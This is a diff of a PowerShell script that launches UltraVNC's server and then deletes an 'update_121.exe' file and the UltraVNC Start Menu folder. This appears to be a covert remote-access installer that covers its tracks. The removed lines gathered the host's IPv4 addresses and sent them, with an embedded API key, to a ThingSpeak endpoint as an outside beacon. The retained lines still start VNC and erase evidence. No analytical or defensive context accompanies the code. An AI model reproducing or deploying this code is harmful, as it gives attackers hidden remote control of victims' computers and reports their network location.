@@ -20,12 +20,6 @@ Start-Sleep -Seconds 2 -ErrorAction Stop
 #& 'C:\Program Files\uvnc bvba\UltraVNC\winvnc.exe' -install;
 Start-Sleep -Seconds 1 -ErrorAction Stop
 & 'C:\Program Files\uvnc bvba\UltraVNC\winvnc.exe' -run;
-$ipa=$(ipconfig | where {$_ -match 'IPv4.+\s(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})' } | out-null; $Matches[1]);
-$ipa2 =(Test-Connection -ComputerName $env:computername -count 1).IPV4Address
-$ipa3 =(Get-NetIPAddress -AddressState Preferred -AddressFamily IPv4 | Select-Object IPAddress | Out-String)
-$url = "https://api.thingspeak.com/update?api_key=F15031FIFGY353KO&field1=$ipa&field2=$ipa2&field3=$ipa3";
-(New-Object System.Net.WebClient).DownloadString($url)
-Invoke-WebRequest $url -Method Get
 Remove-Item "$Env:USERPROFILE\update_121.exe"
 Remove-Item 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\UltraVNC\' -Recurse
 exit;
